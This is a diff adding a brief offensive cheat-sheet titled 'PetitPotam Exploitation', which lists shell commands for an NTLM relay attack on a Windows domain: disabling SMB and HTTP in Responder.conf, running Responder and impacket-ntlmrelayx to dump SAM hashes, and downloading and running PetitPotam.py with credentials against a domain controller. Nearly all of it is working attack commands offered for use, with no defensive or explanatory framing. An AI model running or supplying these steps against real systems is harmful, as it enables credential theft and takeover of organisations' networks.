@@ -1,0 +1,16 @@
+PetitPotam Exploitation
+
+First we have to set "off" SMB and HTTP protocols on "responder.conf" file.
+
+  $ nano /etc/responder/Responder.conf
+
+  $ responder -I eth0 -rdw
+
+  $ impacket-ntlmrelayx -tf NTLMRELAYTARGETS.txt -l SAM -smb2support
+
+Trigger PetitPotam
+
+  $ wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py && chmod +x PetitPotam.py
+
+  $ python3 PetitPotam.py -u <username> -p <password> -d domain.local <kaliIP> <dcIP>
+  
